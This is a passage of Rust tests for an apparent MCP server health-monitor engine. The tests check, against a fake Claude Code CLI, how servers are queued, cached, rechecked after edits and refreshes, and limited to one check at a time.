        serde_json::json!({"type": "http", "url": url})
    }

    #[test]
    fn startup_loads_the_snapshot_finds_the_cli_and_checks_unknown_servers() {
        let env = Env::new(
            &serde_json::json!({"mcpServers": {
                "azure-devops": {"type": "stdio", "command": "npx"},
                "broken": {"type": "stdio", "command": "nope"}}}),
            r#"{"rules":[
                {"args":["--version"],"stdout_file":"version.txt"},
                {"args":["mcp","get","azure-devops"],"stdout_file":"connected.txt"},
                {"args":["mcp","get","broken"],"stdout_file":"failed.txt"}]}"#,
            &[
                ("version.txt", b"2.1.302 (Claude Code)\n"),
                ("connected.txt", CONNECTED),
                ("failed.txt", FAILED),
            ],
        );
        let core = env.start();
        let events = collect(&core, |e| {
            final_status(e, "azure-devops").is_some()
                && final_status(e, "broken").is_some()
                && e.iter().any(|x| matches!(x, Event::CliVersion(Some(_))))
        });
        assert!(
            matches!(&events[0], Event::Snapshot(s) if s.servers.len() == 2),
            "the snapshot comes first: {:?}",
            events[0]
        );
        assert_eq!(
            final_status(&events, "azure-devops"),
            Some(Status::Connected)
        );
        let (st, detail) = status_of(&events, "broken").unwrap();
        assert_eq!(st, Status::Failed);
        assert_eq!(
            detail.as_deref(),
            Some("CONNECTION_CLOSED: Connection closed")
        );
        assert!(
            events
                .iter()
                .any(|e| matches!(e, Event::CliVersion(Some(v)) if v == "2.1.302"))
        );
        // Rows with no cached status show "checking" while they wait.
        assert_eq!(
            events.iter().find_map(|e| match e {
                Event::Status { id, status, .. } if id.name == "azure-devops" => Some(*status),
                _ => None,
            }),
            Some(Status::Checking)
        );
    }

    #[test]
    fn servers_claude_already_knows_are_rechecked_at_startup_keeping_their_last_known_status() {
        // Bug: Claude's caches can be days old, and a server it called healthy was shown Connected until F5.
        let env = Env::new(
            &serde_json::json!({"mcpServers": {
                "known": http("https://a.example.com"),
                "fresh": {"type": "stdio", "command": "x"}}}),
            r#"{"rules":[{"args":["mcp","get","known"],"stdout_file":"f.txt"},
                        {"args":["mcp","get","fresh"],"stdout_file":"c.txt"},
                        {"args":["--version"]}]}"#,
            &[("c.txt", CONNECTED), ("f.txt", FAILED)],
        );
        std::fs::write(
            env.dir.path().join("cfg").join("mcp-health-cache.json"),
            r#"{"version":1,"servers":{"known":{"status":"healthy"}}}"#,
        )
        .unwrap();
        let core = env.start();
        let events = collect(&core, |e| {
            final_status(e, "fresh").is_some() && final_status(e, "known").is_some()
        });
        assert!(
            matches!(&events[0], Event::Snapshot(s)
                if s.servers.iter().any(|r| r.name == "known" && r.status == Status::Connected)),
            "the cached status is shown at once: {:?}",
            events[0]
        );
        assert_eq!(
            final_status(&events, "known"),
            Some(Status::Failed),
            "the live answer replaces what the cache said"
        );
        assert!(
            !events.iter().any(
                |e| matches!(e, Event::Status { id, status: Status::Checking, .. }
                if id.name == "known")
            ),
            "a known server keeps its last-known status while it is checked, not a blank \"checking\""
        );
        let mut names: Vec<String> = env.gets().into_iter().map(|g| g.0).collect();
        names.sort();
        assert_eq!(names, vec!["fresh", "known"], "each is checked once");
    }

    #[test]
    fn servers_with_nothing_to_show_are_checked_before_the_ones_claude_knows() {
        // One check at a time, so the fake CLI's log is in queue order.
        let env = Env::new(
            &serde_json::json!({"mcpServers": {
                "a-auth": http("https://a.example.com"),
                "b-known": http("https://b.example.com"),
                "c-fresh": {"type": "stdio", "command": "x"},
                "d-off": http("https://d.example.com")},
                "projects": {"/p": {"disabledMcpServers": ["d-off"]}}}),
            r#"{"rules":[{"args":["mcp","get"],"stdout_file":"c.txt"},{"args":["--version"]}]}"#,
            &[("c.txt", CONNECTED)],
        );
        std::fs::write(
            env.dir.path().join("cfg").join("mcp-health-cache.json"),
            r#"{"version":1,"servers":{"b-known":{"status":"healthy"},"d-off":{"status":"healthy"}}}"#,
        )
        .unwrap();
        std::fs::write(
            env.dir.path().join("cfg").join("mcp-needs-auth-cache.json"),
            r#"{"a-auth":{}}"#,
        )
        .unwrap();
        let core = start_with(
            EngineConfig {
                max_checks: 1,
                ..env.config()
            },
            || {},
        );
        collect(&core, |e| {
            ["a-auth", "b-known", "c-fresh"]
                .iter()
                .all(|n| final_status(e, n).is_some())
        });
        let order: Vec<String> = env.gets().into_iter().map(|g| g.0).collect();
        assert_eq!(
            order,
            vec!["c-fresh", "a-auth", "b-known"],
            "the unknown one first, then the known ones; the one switched off is not checked"
        );
    }

    /// Claude's needs-auth cache, written now for `names`, as Claude Code writes it.
    fn recently_needing_auth(env: &Env, names: &[String]) {
        let now = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_millis() as u64;
        let entries: serde_json::Map<String, serde_json::Value> = names
            .iter()
            .map(|n| (n.clone(), serde_json::json!({"timestamp": now})))
            .collect();
        std::fs::write(
            env.dir.path().join("cfg").join("mcp-needs-auth-cache.json"),
            serde_json::Value::Object(entries).to_string(),
        )
        .unwrap();
    }

    #[test]
    fn a_server_claude_checked_recently_is_left_alone_until_f5() {
        // Restores the half of the test this slice replaced: F5 checks a server the caches know.
        let env = Env::new(
            &serde_json::json!({"mcpServers": {
                "recent": http("https://a.example.com"),
                "fresh": {"type": "stdio", "command": "x"}}}),
            r#"{"rules":[{"args":["mcp","get"],"stdout_file":"c.txt"},{"args":["--version"]}]}"#,
            &[("c.txt", CONNECTED)],
        );
        recently_needing_auth(&env, &["recent".to_owned()]);
        let core = env.start();
        let events = collect(&core, |e| final_status(e, "fresh").is_some());
        assert!(matches!(&events[0], Event::Snapshot(s)
                if s.servers.iter().any(|r| r.name == "recent" && r.status == Status::NeedsAuth && !r.status_cached)));
        let names: Vec<String> = env.gets().into_iter().map(|g| g.0).collect();
        assert_eq!(
            names,
            ["fresh"],
            "Claude found it needs sign-in minutes ago"
        );

        core.send(Command::Refresh { live_all: true });
        // Both answer again: counting the gets after only one has, the other may not have started yet.
        let events = collect(&core, |e| {
            final_status(e, "recent").is_some() && final_status(e, "fresh").is_some()
        });
        assert_eq!(final_status(&events, "recent"), Some(Status::Connected));
        let mut names: Vec<String> = env.gets().into_iter().map(|g| g.0).collect();
        names.sort();
        assert_eq!(names, ["fresh", "fresh", "recent"], "F5 checks every one");
    }

    #[test]
    fn f5_checks_one_at_a_time_still_check_every_one() {
        // F5 with one check at a time still checks every one.
        let env = Env::new(
            &serde_json::json!({"mcpServers": {
                "recent": http("https://a.example.com"),
                "fresh": {"type": "stdio", "command": "x"}}}),
            r#"{"rules":[{"args":["mcp","get"],"stdout_file":"c.txt"},{"args":["--version"]}]}"#,
            &[("c.txt", CONNECTED)],
        );
        recently_needing_auth(&env, &["recent".to_owned()]);
        let core = start_with(
            EngineConfig {
                max_checks: 1,
                ..env.config()
            },
            || {},
        );
        collect(&core, |e| final_status(e, "fresh").is_some());
        core.send(Command::Refresh { live_all: true });
        let events = collect(&core, |e| {
            final_status(e, "recent").is_some() && final_status(e, "fresh").is_some()
        });
        assert_eq!(final_status(&events, "recent"), Some(Status::Connected));
        let mut names: Vec<String> = env.gets().into_iter().map(|g| g.0).collect();
        names.sort();
        assert_eq!(names, ["fresh", "fresh", "recent"], "F5 checks every one");
    }

    fn max_overlap(gets: &[(String, u64, u64)]) -> usize {
        gets.iter()
            .map(|(_, start, _)| {
                gets.iter()
                    .filter(|(_, s, e)| s <= start && start < e)
                    .count()
            })
            .max()
            .unwrap_or(0)
    }

    #[test]
    fn checks_nobody_asked_for_run_one_at_a_time() {
        // Each is a large Node process: three at once took klefki from 123 MB to about 700 MB at startup.
        let servers: serde_json::Map<String, serde_json::Value> = (0..4)
            .map(|i| (format!("s{i}"), serde_json::json!({"command": "x"})))
            .collect();
        let env = Env::new(
            &serde_json::json!({ "mcpServers": servers }),
            r#"{"rules":[{"args":["--version"]},{"args":["mcp","get"],"stdout_file":"c.txt","delay_ms":300}]}"#,
            &[("c.txt", CONNECTED)],
        );
        let core = env.start();
        collect(&core, |e| {
            (0..4).all(|i| final_status(e, &format!("s{i}")).is_some())
        });
        let gets = env.gets();
        assert_eq!(gets.len(), 4);
        assert_eq!(max_overlap(&gets), 1, "{gets:?}");
    }

    /// What `claude mcp list` prints for `lines` (name, command, status as Claude words it).
    fn list_output(lines: &[(&str, &str)]) -> Vec<u8> {
        let mut text = String::from("Checking MCP server health…\n\n");
        for (name, status) in lines {
            text.push_str(&format!("{name}: x - {status}\n"));
        }
        text.into_bytes()
    }

    fn servers(n: usize) -> serde_json::Value {
        let map: serde_json::Map<String, serde_json::Value> = (0..n)
            .map(|i| (format!("s{i}"), serde_json::json!({"command": "x"})))
            .collect();
        serde_json::json!({ "mcpServers": map })
    }

    const LIST_AND_GET: &str = r#"{"rules":[{"args":["--version"]},
        {"args":["mcp","list"],"stdout_file":"list.txt"},
        {"args":["mcp","get","s2"],"stdout_file":"failed.txt"},
        {"args":["mcp","get","s5"],"stdout_file":"failed.txt"},
        {"args":["mcp","get"],"stdout_file":"c.txt"}]}"#;

    fn all_checked(core: &Core, n: usize) -> Vec<Event> {
        collect(core, |e| {
            (0..n).all(|i| final_status(e, &format!("s{i}")).is_some())
        })
    }

    #[test]
    fn background_checks_in_one_folder_share_one_claude_list() {
        let list = list_output(&[
            ("s0", "✔ Connected"),
            (
                "s1",
                "✘ Failed to connect — CONNECTION_CLOSED: Connection closed",
            ),
            ("s2", "! Connected · tools fetch failed — no tools"),
            ("s3", "! Needs authentication"),
            ("s4", "✔ Connected"),
            ("s5", "✔ Connected"),
        ]);
        let env = Env::new(
            &servers(6),
            LIST_AND_GET,
            &[
                ("list.txt", &list),
                ("c.txt", CONNECTED),
                ("failed.txt", FAILED),
            ],
        );
        let core = env.start();
        let events = all_checked(&core, 6);
        let said = |n: &str| status_of(&events, n);
        assert_eq!(said("s0"), Some((Status::Connected, None)));
        assert_eq!(
            said("s1"),
            Some((
                Status::Failed,
                Some("CONNECTION_CLOSED: Connection closed".to_owned())
            ))
        );
        assert_eq!(
            said("s2"),
            Some((Status::Degraded, Some("no tools".to_owned())))
        );
        assert_eq!(said("s3").map(|s| s.0), Some(Status::NeedsAuth));
        assert_eq!(said("s5"), Some((Status::Connected, None)));
        assert_eq!(env.lists().len(), 1, "one list for the folder");
        assert!(env.gets().is_empty(), "no get: {:?}", env.gets());
    }

    #[test]
    fn a_server_the_list_does_not_answer_clearly_is_checked_on_its_own() {
        // s2 is on two lines and s5 on none: Claude is asked about each of them, and the list is not asked again.
        let list = list_output(&[
            ("s0", "✔ Connected"),
            ("s1", "✔ Connected"),
            ("s2", "✔ Connected"),
            ("s2", "✔ Connected"),
            ("s3", "✔ Connected"),
            ("s4", "✔ Connected"),
        ]);
        let env = Env::new(
            &servers(6),
            LIST_AND_GET,
            &[
                ("list.txt", &list),
                ("c.txt", CONNECTED),
                ("failed.txt", FAILED),
            ],
        );
        let core = env.start();
        let events = all_checked(&core, 6);
        assert_eq!(final_status(&events, "s0"), Some(Status::Connected));
        assert_eq!(
            final_status(&events, "s2"),
            Some(Status::Failed),
            "its own get"
        );
        assert_eq!(
            final_status(&events, "s5"),
            Some(Status::Failed),
            "its own get"
        );
        let mut asked: Vec<String> = env.gets().into_iter().map(|g| g.0).collect();
        asked.sort();
        assert_eq!(asked, ["s2", "s5"]);
        assert_eq!(env.lists().len(), 1);
    }

    #[test]
    fn when_the_list_fails_every_server_is_checked_with_get() {
        // Variant: a list that exits 1, and one that exits 0 with nothing usable, both leave the servers to `get`.
        for scenario in [
            r#"{"rules":[{"args":["--version"]},{"args":["mcp","list"],"exit_code":1},{"args":["mcp","get"],"stdout_file":"c.txt"}]}"#,
            r#"{"rules":[{"args":["--version"]},{"args":["mcp","list"],"stdout_file":"nonsense.txt"},{"args":["mcp","get"],"stdout_file":"c.txt"}]}"#,
        ] {
            let env = Env::new(
                &servers(6),
                scenario,
                &[("c.txt", CONNECTED), ("nonsense.txt", b"something else\n")],
            );
            let core = env.start();
            let events = all_checked(&core, 6);
            assert_eq!(final_status(&events, "s3"), Some(Status::Connected));
            assert_eq!(env.gets().len(), 6, "{scenario}");
            assert_eq!(env.lists().len(), 1, "not asked again: {scenario}");
        }
    }

    #[test]
    fn a_list_answer_a_timeout_may_have_caused_is_checked_with_get() {
        // The list runs with a short timeout so a hanging server cannot hold the others back; what it says
        // about a server that ran out of time is not Claude's answer, which `get` gives with the full time.
        let list = list_output(&[
            ("s0", "✔ Connected"),
            ("s1", "✘ Failed to connect — Request timed out"),
            (
                "s2",
                "✘ Failed to connect — MCP server \"[redacted]\" connection timed out after 3000ms",
            ),
            ("s3", "! Connected · tools fetch failed — Request timed out"),
            ("s4", "✔ Connected"),
            ("s5", "✘ Failed to connect"),
        ]);
        let env = Env::new(
            &servers(6),
            LIST_AND_GET,
            &[
                ("list.txt", &list),
                ("c.txt", CONNECTED),
                ("failed.txt", FAILED),
            ],
        );
        let core = env.start();
        let events = all_checked(&core, 6);
        assert_eq!(
            final_status(&events, "s1"),
            Some(Status::Connected),
            "its get"
        );
        assert_eq!(final_status(&events, "s2"), Some(Status::Failed), "its get");
        assert_eq!(
            final_status(&events, "s3"),
            Some(Status::Connected),
            "its get"
        );
        assert_eq!(final_status(&events, "s5"), Some(Status::Failed), "its get");
        let mut asked: Vec<String> = env.gets().into_iter().map(|g| g.0).collect();
        asked.sort();
        assert_eq!(asked, ["s1", "s2", "s3", "s5"]);
        assert_eq!(env.lists().len(), 1);
    }

    #[test]
    fn a_server_that_never_connected_in_the_list_is_checked_after_one_that_was_only_slow() {
        // A hanging server's own `get` takes 30 s, so the others come first, though it is first in the queue and
        // is the job that ran the list.
        let list = list_output(&[
            (
                "s0",
                "✘ Failed to connect — MCP server \"s0\" connection timed out after 3000ms",
            ),
            ("s1", "✘ Failed to connect — Request timed out"),
            ("s2", "✔ Connected"),
            ("s3", "✔ Connected"),
            ("s4", "✔ Connected"),
            ("s5", "✔ Connected"),
        ]);
        let env = Env::new(
            &servers(6),
            LIST_AND_GET,
            &[
                ("list.txt", &list),
                ("c.txt", CONNECTED),
                ("failed.txt", FAILED),
            ],
        );
        let core = env.start();
        let events = all_checked(&core, 6);
        assert_eq!(
            final_status(&events, "s2"),
            Some(Status::Connected),
            "from the list"
        );
        assert_eq!(
            final_status(&events, "s0"),
            Some(Status::Connected),
            "its own get"
        );
        let asked: Vec<String> = env.gets().into_iter().map(|g| g.0).collect();
        assert_eq!(asked, ["s1", "s0"], "the slow one first");
        assert_eq!(env.lists().len(), 1);
    }

    #[test]
    fn the_list_is_asked_for_a_short_timeout_and_a_wide_batch_without_the_connectors() {
        let base = [("FAKE", OsStr::new("1"))];
        let env = list_env(base.to_vec());
        assert!(
            env.contains(&("FAKE", OsStr::new("1"))),
            "the usual environment stays"
        );
        for (key, value) in [
            ("ENABLE_CLAUDEAI_MCP_SERVERS", "false"),
            ("MCP_TIMEOUT", "3000"),
            ("MCP_SERVER_CONNECTION_BATCH_SIZE", "10"),
        ] {
            assert!(env.contains(&(key, OsStr::new(value))), "{key}");
        }
    }

    #[test]
    fn a_list_that_hangs_is_ended_and_the_servers_are_checked_with_get() {
        let env = Env::new(
            &servers(6),
            r#"{"rules":[{"args":["--version"]},{"args":["mcp","list"],"hang":true},{"args":["mcp","get"],"stdout_file":"c.txt"}]}"#,
            &[("c.txt", CONNECTED)],
        );
        let mut config = env.config();
        config.check_timeout = Duration::from_millis(400);
        let core = start_with(config, || {});
        let events = all_checked(&core, 6);
        assert_eq!(final_status(&events, "s4"), Some(Status::Connected));
        assert_eq!(env.gets().len(), 6);
        assert_eq!(env.lists().len(), 1, "not asked again");
    }

    #[test]
    fn servers_a_list_could_not_answer_keep_their_order_and_the_one_that_ran_it_its_place() {
        // Regression (Windows CI): the job that ran the list went to the back, behind servers that were after it, so
        // a server on screen could be checked before an earlier one. The list fails slowly; the servers on screen
        // are named while it runs.
        let env = Env::new(
            &servers(5),
            r#"{"rules":[{"args":["--version"]},{"args":["mcp","list"],"delay_ms":600,"exit_code":1},{"args":["mcp","get"],"stdout_file":"c.txt"}]}"#,
            &[("c.txt", CONNECTED)],
        );
        let core = env.start();
        std::thread::sleep(Duration::from_millis(250));
        core.send(Command::Visible(vec![
            crate::model::ConnectionId::new(Scope::User, None, "s4"),
            crate::model::ConnectionId::new(Scope::User, None, "s3"),
        ]));
        all_checked(&core, 5);
        let order: Vec<String> = env.gets().into_iter().map(|g| g.0).collect();
        assert_eq!(order, ["s3", "s4", "s0", "s1", "s2"], "{order:?}");
    }

    #[test]
    fn a_few_servers_are_checked_one_by_one() {
        // A list starts every server of the folder; for a few, separate gets are not slower and start only those.
        let env = Env::new(
            &servers(3),
            LIST_AND_GET,
            &[
                ("list.txt", b""),
                ("c.txt", CONNECTED),
                ("failed.txt", FAILED),
            ],
        );
        let core = env.start();
        all_checked(&core, 3);
        assert_eq!(env.gets().len(), 3);
        assert!(env.lists().is_empty());
    }

    #[test]
    fn a_check_the_user_asks_for_is_always_a_get() {
        let list = list_output(
            &(0..6)
                .map(|i| (["s0", "s1", "s2", "s3", "s4", "s5"][i], "✔ Connected"))
                .collect::<Vec<_>>(),
        );
        let env = Env::new(
            &servers(6),
            LIST_AND_GET,
            &[
                ("list.txt", &list),
                ("c.txt", CONNECTED),
                ("failed.txt", FAILED),
            ],
        );
        let core = env.start();
        all_checked(&core, 6);
        core.send(Command::Check(user_id("s5")));
        let events = collect(&core, |e| final_status(e, "s5").is_some());
        assert_eq!(
            final_status(&events, "s5"),
            Some(Status::Failed),
            "its get answered"
        );
        assert_eq!(env.lists().len(), 1);
        assert_eq!(env.gets().len(), 1);
    }

    #[test]
    fn each_folder_gets_its_own_list() {
        let env = Env::new(
            &serde_json::json!({}),
            r#"{"rules":[{"args":["--version"]},{"args":["mcp","list"],"stdout_file":"list.txt"},{"args":["mcp","get"],"stdout_file":"failed.txt"}]}"#,
            &[
                (
                    "list.txt",
                    &list_output(&[
                        ("a0", "✔ Connected"),
                        ("a1", "✔ Connected"),
                        ("a2", "✔ Connected"),
                        ("a3", "✔ Connected"),
                    ]),
                ),
                ("failed.txt", FAILED),
            ],
        );
        // Two projects, four local servers each, named alike so the one list text answers both.
        let (p1, p2) = (env.dir.path().join("p1"), env.dir.path().join("p2"));
        std::fs::create_dir_all(&p1).unwrap();
        std::fs::create_dir_all(&p2).unwrap();
        let local: serde_json::Map<String, serde_json::Value> = (0..4)
            .map(|i| (format!("a{i}"), serde_json::json!({"command": "x"})))
            .collect();
        std::fs::write(
            env.dir.path().join("cfg").join(".claude.json"),
            serde_json::json!({"projects": {
                p1.to_str().unwrap(): {"mcpServers": local},
                p2.to_str().unwrap(): {"mcpServers": local}}})
            .to_string(),
        )
        .unwrap();
        let core = env.start();
        collect(&core, |e| {
            e.iter()
                .filter(
                    |x| matches!(x, Event::Status { status, .. } if *status != Status::Checking),
                )
                .count()
                >= 8
        });
        let mut folders = env.lists();
        folders.sort();
        assert_eq!(folders.len(), 2, "{folders:?}");
        assert!(
            folders[0].ends_with("p1") && folders[1].ends_with("p2"),
            "{folders:?}"
        );
        assert!(env.gets().is_empty(), "{:?}", env.gets());
    }

    #[test]
    fn a_check_the_user_asks_for_does_not_wait_for_the_background_ones() {
        let servers: serde_json::Map<String, serde_json::Value> = (0..3)
            .map(|i| (format!("s{i}"), serde_json::json!({"command": "x"})))
            .chain([("mine".to_owned(), serde_json::json!({"command": "x"}))])
            .collect();
        let env = Env::new(
            &serde_json::json!({ "mcpServers": servers }),
            r#"{"rules":[{"args":["--version"]},{"args":["mcp","get"],"stdout_file":"c.txt","delay_ms":800}]}"#,
            &[("c.txt", CONNECTED)],
        );
        recently_needing_auth(&env, &["mine".to_owned()]);
        let core = env.start();
        collect(&core, |e| {
            e.iter().any(|x| {
                matches!(
                    x,
                    Event::Status {
                        status: Status::Checking,
                        ..
                    }
                )
            })
        });
        core.send(Command::Check(user_id("mine")));
        collect(&core, |e| final_status(e, "mine").is_some());
        let gets = env.gets();
        let done = |n: &str| gets.iter().filter(|g| g.0 == n).count();
        assert_eq!(done("mine"), 1);
        assert!(
            (0..3).filter(|i| done(&format!("s{i}")) == 1).count() < 3,
            "it ran beside the background checks, not after them: {gets:?}"
        );
    }

    // ---- checks across edits and refreshes

    /// The connection of the user server `name`.
    fn user_connection(name: &str) -> crate::model::ConnectionId {
        user_id(name).connection
    }

    /// The events after the first snapshot in which the user server `name`'s target is `target`.
    fn after_target<'a>(events: &'a [Event], name: &str, target: &str) -> Option<&'a [Event]> {
        let at = events.iter().position(|e| {
            matches!(e, Event::Snapshot(s)
                if s.servers.iter().any(|r| r.name == name && r.target == target))
        })?;
        Some(&events[at + 1..])
    }

    #[test]
    fn an_edited_server_is_checked_again() {
        let env = Env::new(
            &serde_json::json!({"mcpServers": {"s": {"command": "old"}}}),
            r#"{"rules":[{"args":["--version"]},{"args":["mcp","get"],"stdout_file":"c.txt"}]}"#,
            &[("c.txt", CONNECTED), ("f.txt", FAILED)],
        );
        let core = env.start();
        collect(&core, |e| final_status(e, "s") == Some(Status::Connected));
        // The new definition fails; the old verdict must not stay on it.
        write_scenario(
            env.dir.path(),
            r#"{"rules":[{"args":["--version"]},{"args":["mcp","get"],"stdout_file":"f.txt"}]}"#,
            &[],
        );
        write_config(
            &env,
            &serde_json::json!({"mcpServers": {"s": {"command": "new"}}}),
        );
        let events = collect(&core, |e| {
            after_target(e, "s", "new").is_some_and(|a| final_status(a, "s").is_some())
        });
        let after = after_target(&events, "s", "new").unwrap();
        assert_eq!(final_status(after, "s"), Some(Status::Failed), "{after:#?}");
        assert_eq!(env.gets().len(), 2, "{:?}", env.gets());
    }

    #[test]
    fn a_server_whose_environment_alone_changed_is_checked_again() {
        // The variant: nothing the row shows changed, only what the server is started with.
        let env = Env::new(
            &serde_json::json!({"mcpServers": {"s": {"command": "x", "env": {"A": "1"}}}}),
            r#"{"rules":[{"args":["--version"]},{"args":["mcp","get"],"stdout_file":"c.txt"}]}"#,
            &[("c.txt", CONNECTED), ("f.txt", FAILED)],
        );
        let core = env.start();
        collect(&core, |e| final_status(e, "s") == Some(Status::Connected));
        write_scenario(
            env.dir.path(),
            r#"{"rules":[{"args":["--version"]},{"args":["mcp","get"],"stdout_file":"f.txt"}]}"#,
            &[],
        );
        write_config(
            &env,
            &serde_json::json!({"mcpServers": {"s": {"command": "x", "env": {"A": "2"}}}}),
        );
        collect(&core, |e| final_status(e, "s") == Some(Status::Failed));
        assert_eq!(env.gets().len(), 2, "{:?}", env.gets());
    }

    #[test]
    fn a_server_left_alone_by_an_edit_is_not_checked_again() {
        // The other side: an edit of one server does not re-check the others.
        let env = Env::new(
            &serde_json::json!({"mcpServers": {"s": {"command": "x"}, "t": {"command": "y"}}}),
            r#"{"rules":[{"args":["--version"]},{"args":["mcp","get"],"stdout_file":"c.txt"}]}"#,
            &[("c.txt", CONNECTED)],
        );
        let core = env.start();
        collect(&core, |e| {
            final_status(e, "s").is_some() && final_status(e, "t").is_some()
        });
        write_config(
            &env,
            &serde_json::json!({"mcpServers": {"s": {"command": "x2"}, "t": {"command": "y"}}}),
        );
        collect(&core, |e| {
            after_target(e, "s", "x2").is_some_and(|a| final_status(a, "s").is_some())
        });
        let gets: Vec<String> = env.gets().into_iter().map(|g| g.0).collect();
        assert_eq!(gets.iter().filter(|n| *n == "t").count(), 1, "{gets:?}");
        assert_eq!(gets.iter().filter(|n| *n == "s").count(), 2, "{gets:?}");
    }

    #[test]
    fn a_check_running_while_its_server_is_edited_does_not_answer_for_the_new_definition() {
        let env = Env::new(
            &serde_json::json!({"mcpServers": {"s": {"command": "old"}}}),
            r#"{"rules":[{"args":["--version"]},{"args":["mcp","get"],"stdout_file":"c.txt","delay_ms":1500}]}"#,
            &[("c.txt", CONNECTED), ("f.txt", FAILED)],
        );
        let core = env.start();
        collect(&core, |e| {
            status_of(e, "s").is_some_and(|s| s.0 == Status::Checking)
        });
        write_scenario(
            env.dir.path(),
            r#"{"rules":[{"args":["--version"]},{"args":["mcp","get"],"stdout_file":"f.txt"}]}"#,
            &[],
        );
        write_config(
            &env,
            &serde_json::json!({"mcpServers": {"s": {"command": "new"}}}),
        );
        let mut events = collect(&core, |e| {
            after_target(e, "s", "new").is_some_and(|a| final_status(a, "s").is_some())
        });
        // Until the first check has ended, so its late answer would be among the events.
        let deadline = Instant::now() + WAIT;
        while env.gets().iter().any(|g| g.2 == u64::MAX) {
            assert!(Instant::now() < deadline, "{:?}", env.gets());
            std::thread::sleep(Duration::from_millis(20));
        }
        std::thread::sleep(Duration::from_millis(300));
        while let Some(e) = core.try_recv() {
            events.push(e);
        }
        let after = after_target(&events, "s", "new").unwrap();
        assert!(
            !after.iter().any(|e| matches!(e,
                Event::Status { id, status: Status::Connected, .. } if id.connection == user_connection("s"))),
            "the old definition's verdict: {after:#?}"
        );
        assert_eq!(final_status(after, "s"), Some(Status::Failed), "{after:#?}");
    }

    #[test]
    fn a_check_the_user_asked_for_still_answers_after_f5() {
        // It was running when the refresh came: its answer is about a server that did not change.
        let env = Env::new(
            &serde_json::json!({"mcpServers": {"mine": {"command": "x"}}}),
            r#"{"rules":[{"args":["--version"]},{"args":["mcp","get"],"stdout_file":"c.txt","delay_ms":800}]}"#,
            &[("c.txt", CONNECTED)],
        );
        recently_needing_auth(&env, &["mine".to_owned()]);
        let core = env.start();
        core.send(Command::Check(user_id("mine")));
        collect(&core, |e| {
            status_of(e, "mine").is_some_and(|s| s.0 == Status::Checking)
        });
        core.send(Command::Refresh { live_all: false });
        collect(&core, |e| {
            final_status(e, "mine") == Some(Status::Connected)
        });
        assert_eq!(env.gets().len(), 1, "{:?}", env.gets());
    }

    #[test]
    fn a_check_still_running_is_announced_again_after_a_refresh() {
        // Cross-review of #14: the app drops "Checking…" on every snapshot, so a check that goes on would look done.
        let env = Env::new(
            &serde_json::json!({"mcpServers": {"mine": {"command": "x"}}}),
            r#"{"rules":[{"args":["--version"]},{"args":["mcp","get"],"stdout_file":"c.txt","delay_ms":1500}]}"#,
            &[("c.txt", CONNECTED)],
        );
        recently_needing_auth(&env, &["mine".to_owned()]);
        let core = env.start();
        core.send(Command::Check(user_id("mine")));
        collect(&core, |e| {
            status_of(e, "mine").is_some_and(|s| s.0 == Status::Checking)
        });
        core.send(Command::Refresh { live_all: false });
        let events = collect(&core, |e| final_status(e, "mine").is_some());
        let snapshot = events
            .iter()
            .rposition(|e| matches!(e, Event::Snapshot(_)))
            .expect("the refresh's snapshot");
        assert_eq!(
            status_of(&events[snapshot..], "mine").map(|s| s.0),
            Some(Status::Connected)
        );
        assert!(
            events[snapshot..].iter().any(|e| matches!(e,
                Event::Status { id, status: Status::Checking, .. } if id.name == "mine")),
            "{:#?}",
            &events[snapshot..]
        );
    }

    #[test]
    fn a_check_of_a_server_since_edited_is_not_announced_again() {
        // Cross-review of #14, round 2: its answer will not come, so "Checking…" said again would stay for good.
        let env = Env::new(
            &serde_json::json!({"mcpServers": {"mine": {"command": "old"}}}),
            r#"{"rules":[{"args":["--version"]},{"args":["mcp","get"],"stdout_file":"c.txt","delay_ms":1500}]}"#,
            &[("c.txt", CONNECTED)],
        );
        let core = start_with(
            EngineConfig {
                background_checks: false,
                ..env.config()
            },
            || {},
        );
        collect(&core, |e| e.iter().any(|x| matches!(x, Event::Snapshot(_))));
        core.send(Command::Check(user_id("mine")));
        collect(&core, |e| {
            status_of(e, "mine").is_some_and(|s| s.0 == Status::Checking)
        });
        write_config(
            &env,
            &serde_json::json!({"mcpServers": {"mine": {"command": "new"}}}),
        );
        collect(&core, |e| {
            after_target(e, "mine", "new").is_some_and(|a| status_of(a, "mine").is_some())
        });
        // An unrelated reload while the stale check still runs.
        core.send(Command::Refresh { live_all: false });
        let deadline = Instant::now() + WAIT;
        while env.gets().iter().any(|g| g.2 == u64::MAX) {
            assert!(Instant::now() < deadline, "{:?}", env.gets());
            std::thread::sleep(Duration::from_millis(20));
        }
        std::thread::sleep(Duration::from_millis(300));
        let mut events = Vec::new();
        while let Some(e) = core.try_recv() {
            events.push(e);
        }
        assert!(
            events.iter().any(|e| matches!(e, Event::Snapshot(_))),
            "the refresh came after the edit: {events:#?}"
        );
        assert_ne!(
            status_of(&events, "mine").map(|s| s.0),
            Some(Status::Checking),
            "{events:#?}"
        );
    }

    #[test]
    fn a_check_the_user_asked_for_of_a_server_since_removed_is_not_run() {
        let env = Env::new(
            &serde_json::json!({"mcpServers": {"busy": {"command": "x"}, "gone": {"command": "y"}}}),
            r#"{"rules":[{"args":["--version"]},{"args":["mcp","get"],"stdout_file":"c.txt","delay_ms":800}]}"#,
            &[("c.txt", CONNECTED)],
        );
        recently_needing_auth(&env, &["gone".to_owned()]);
        let core = start_with(
            EngineConfig {
                max_checks: 1,
                watch_interval: None,
                ..env.config()
            },
            || {},
        );
        collect(&core, |e| {
            status_of(e, "busy").is_some_and(|s| s.0 == Status::Checking)
        });
        core.send(Command::Check(user_id("gone")));
        write_config(
            &env,
            &serde_json::json!({"mcpServers": {"busy": {"command": "x"}}}),
        );
        core.send(Command::Refresh { live_all: false });
        collect(&core, |e| final_status(e, "busy").is_some());
        std::thread::sleep(Duration::from_millis(500));
        let gets: Vec<String> = env.gets().into_iter().map(|g| g.0).collect();
        assert!(!gets.iter().any(|n| n == "gone"), "{gets:?}");
    }

    #[test]
    fn an_edited_server_that_cannot_be_checked_says_why() {
        // Cross-review of #14: the reason it was not checked stays, not a vaguer "changed since its last check".
        let env = quiet_env(&serde_json::json!({
            "projects": {"/work/missing": {"mcpServers": {"loc": {"command": "old"}}}}
        }));
        let core = env.start();
        collect(&core, |e| status_of(e, "loc").is_some());
        write_config(
            &env,
            &serde_json::json!({"projects": {"/work/missing": {"mcpServers": {"loc": {"command": "new"}}}}}),
        );
        let mut events = collect(&core, |e| {
            after_target(e, "loc", "new").is_some_and(|a| status_of(a, "loc").is_some())
        });
